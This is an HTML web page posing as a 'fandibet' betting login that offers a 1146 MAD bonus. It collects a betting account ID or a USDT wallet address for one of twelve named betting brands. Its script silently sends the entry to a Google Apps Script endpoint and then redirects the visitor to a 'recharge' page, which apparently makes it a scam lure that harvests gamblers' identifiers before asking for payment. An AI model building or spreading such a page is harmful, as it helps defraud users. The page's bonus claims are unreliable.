<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <title>fandibet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
  <style>
    body { margin:0; background:#0b0c10; color:#fff; font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif; min-height:100vh; display:flex; flex-direction:column; }
    header { background:#1c1c1c; height:44px; display:flex; justify-content:center; align-items:center; }
    .logo { font-size:16px; font-weight:500; }
    .bonus { text-align:left; padding:10px; font-size:13px; }
    .bonus-offer { text-align:left; padding:0 10px 5px 10px; font-size:13px; font-weight:600; color:#28c76f; }
    .big-login { text-align:left; padding:0 10px; font-size:28px; font-weight:700; margin:10px 0; }
    .container { margin-top:10px; display:flex; justify-content:center; flex:1; }
    .form-box { width:95%; max-width:320px; display:flex; flex-direction:column; gap:16px; }
    .input-group { display:flex; flex-direction:column; gap:4px; }
    .input-group label { font-size:13px; color:#fff; display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
    .required-star { color:#ff3b3b; margin-left:2px; }
    .token-icon { width:18px; height:18px; display:inline-block; vertical-align:middle; }
    .input-group select, .input-group input { width:100%; height:34px; border:none; border-radius:4px; background:#dfe4eb; font-size:13px; color:#000; padding:0 8px; box-sizing:border-box; }
    .input-group select:focus, .input-group input:focus { outline:none; box-shadow:none; }
    .login-btn { margin-top:30px; width:100%; height:46px; background:#28c76f; border:none; border-radius:6px; color:#000; font-size:15px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; position:relative; }
    .spinner { width:20px; height:20px; border:3px solid rgba(0,0,0,0.2); border-top:3px solid #000; border-radius:50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
    .platform-tags { margin-top:10px; display:flex; flex-wrap:wrap; justify-content:center; gap:4px; }
    .platform-tags span { background:#1c1c1c; color:#28c76f; font-size:11px; padding:4px 8px; border-radius:12px; opacity:0.85; }
    .cookie-text { text-align:center; font-size:12px; line-height:1.6; margin:15px auto 5px auto; max-width:360px; color:#fff; }
    .cookie-text p { margin:0 0 8px 0; }
    .cookie-text a { color:#28c76f; text-decoration:none; }
    .footer-text { text-align:center; font-size:12px; margin:5px auto 20px auto; color:#aaa; }
    .disabled * { pointer-events:none; opacity:0.6; }
    .loading-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:#0b0c10; display:flex; align-items:center; justify-content:center; z-index:999; flex-direction:column; }
    .loading-text { margin-top:12px; font-size:14px; color:#fff; }
  </style>
</head>
<body translate="no">
  <header>
    <div class="logo" translate="no">fandibet</div>
  </header>
  <div class="bonus" translate="no">Crédit d'un bonus d'un montant de 1146 MAD</div>
  <div class="bonus-offer" translate="no">100% DE BONUS SUR VOTRE PREMIER DEPOSIT</div>
  <div class="big-login" translate="no">Log In</div>
  <div class="container">
    <div class="form-box" id="formBox">
      <div class="input-group">
        <label for="platform" translate="no">Plateforme <span class="required-star">*</span></label>
        <select id="platform" name="platform" translate="no">
          <option>Betwinner</option>
          <option>888Starz</option>
          <option>Xparibet</option>
          <option>MelBet</option>
          <option>1xBet</option>
          <option>LINEBET</option>
          <option>Mega Pari</option>
          <option>Gooobet</option>
          <option>Stake</option>
          <option>MyStake</option>
          <option>1win</option>
          <option>RiskoBet</option>
        </select>
      </div>
      <div class="input-group">
        <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
        <input type="text" id="account" name="account" translate="no" />
      </div>
      <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
        <span id="btnText">Log In</span>
      </button>
      <div class="platform-tags" translate="no">
        <span>Betwinner</span><span>888Starz</span><span>Xparibet</span><span>MelBet</span><span>1xBet</span><span>LINEBET</span><span>Mega Pari</span><span>Gooobet</span><span>Stake</span><span>MyStake</span><span>1win</span><span>RiskoBet</span>
      </div>
      <div class="cookie-text">
        <p>
          يستخدم <strong>fandibet</strong> ملفات تعريف الارتباط لضمان حصولك على أفضل تجربة مستخدم.<br>
          بمواصلة تصفح الموقع، فإنك توافق على استخدام ملفات تعريف الارتباط على <strong>fandibet</strong>.
        </p>
        <a href="#">تعرّف على المزيد</a>
      </div>
      <div class="footer-text">
        © 2019 - 2025 "fandibet" جميع الحقوق محفوظة – الطبع والنشر محمي.
      </div>
    </div>
  </div>
  <div id="loadingScreen" class="loading-screen" style="display:none;">
    <div class="spinner"></div>
    <div class="loading-text">Chargement...</div>
  </div>
  <script>
    const platformSelect = document.getElementById('platform');
    const accountLabel = document.getElementById('account-label');
    const accountInput = document.getElementById("account");
    const loginBtn = document.getElementById("loginBtn");
    const btnText = document.getElementById("btnText");
    const formBox = document.getElementById("formBox");
    const loadingScreen = document.getElementById("loadingScreen");

    platformSelect.addEventListener('change', function() {
      const value = this.value.toLowerCase();

      if (value === 'stake' || value === 'mystake') {
        // Wallet Address
        accountLabel.innerHTML = `Wallet Address <span class="required-star">*</span> <img src="https://i.postimg.cc/W3GvcnjM/Tgxt-DYbk2-IOs-BCx-UFUr5ksc-D2-Fjm2lv-LBRK2dr-PR.png" class="token-icon" alt="USDT"> Tether USD (ERC20)`;
        accountInput.value = "";
        accountInput.removeAttribute("maxlength");
        accountInput.oninput = function() {
          this.value = this.value.replace(/[\u0600-\u06FF]/g, ''); // منع العربية
        };
      } else {
        // Numéro de compte ID: أرقام فقط
        accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
        accountInput.value = "";
        accountInput.setAttribute("maxlength", "15");
        accountInput.oninput = function() {
          this.value = this.value.replace(/\D/g, ''); // فقط أرقام
          if (this.value.length > 15) this.value = this.value.slice(0, 15);
        };
      }
    });

    async function sendData() {
      const platform = platformSelect.value;
      const account = accountInput.value;

      if (platform === "Stake" || platform === "MyStake") {
        if (account.length < 10) { return; } // Wallet Address min 10
      } else {
        if (account.length < 4 || account.length > 15) { return; } // ID بين 4 و 15 رقم
      }

      if (!platform || !account) return;

      formBox.classList.add("disabled");
      btnText.style.display = "none";
      loginBtn.innerHTML = '<div class="spinner"></div>';
      loadingScreen.style.display = "flex";

      const data = { platform, account };

      try {
        await fetch("https://script.google.com/macros/s/AKfycbz7MooJyUYwNZyWdaNJwWTz4wDNnXt8-TpaXbJk2R787VaBpLG4hK6WW1KbZkzAFSS-Cw/exec", {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
      } catch (error) {
      } finally {
        setTimeout(() => {
          window.location.href = "recharge";
        }, 2000);
      }
    }

    // فرض أولي: Numéro de compte ID يكون أرقام فقط عند تحميل الصفحة
    accountInput.oninput = function() {
      this.value = this.value.replace(/\D/g, '');
      if (this.value.length > 15) this.value = this.value.slice(0, 15);
    };
  </script>
</body>
</html>
